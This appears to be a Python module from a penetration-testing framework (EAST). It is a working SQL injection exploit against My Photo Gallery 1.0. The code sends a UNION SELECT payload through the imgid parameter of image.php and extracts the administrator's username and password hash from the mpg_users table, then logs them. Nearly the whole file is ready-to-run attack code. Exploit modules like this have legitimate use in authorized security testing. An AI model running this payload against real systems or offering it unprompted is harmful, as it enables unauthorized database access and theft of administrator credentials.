#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_my_photo_gallery_sqli"
INFO['DESCRIPTION'] = "My Photo Gallery 1.0 - SQL Injection"
INFO['VENDOR'] = "http://software.friendsinwar.com/"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/d9b2fda349097b813ea4534690069adf-My%20Photo%20Gallery%201.0.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41177/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """An SQL Injection vulnerability in My Photo Gallery allows attackers to read
arbitrary administrator data from the database."""

INFO['CHANGELOG'] = "30 Jan, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/myphotogallery', dict(description = 'Basepath')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')

class exploit(Sploit):
    def __init__(self, host="", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.ssl = False
        self.basepath = "/"
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.ssl = self.args.get('SSL', self.ssl)
    
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'

    def run(self):
        self.args()
        
        url = self.make_url('/image.php?')
        
        sql = 'imgid=' + urllib.quote('1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(char(35,35,35),username,char(58),password,char(35,35,35)) FROM mpg_users WHERE id=1 -- ')
        
        self.log('Begin extracting admin\'s credentials')
        result = ''
        try:
            fd = urllib2.urlopen(url + sql)
            result = fd.read().split('###')[1]
        except Exception as e:
            self.log(e)
            self.log("Failed!")
            self.finish(False)

        if result:
            self.log('Output format username:hash-password')
            self.log('=' * 60)
            self.log('End with: {}'.format(result))
            self.log('=' * 60)
            self.finish(True)
            
        self.finish(False)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
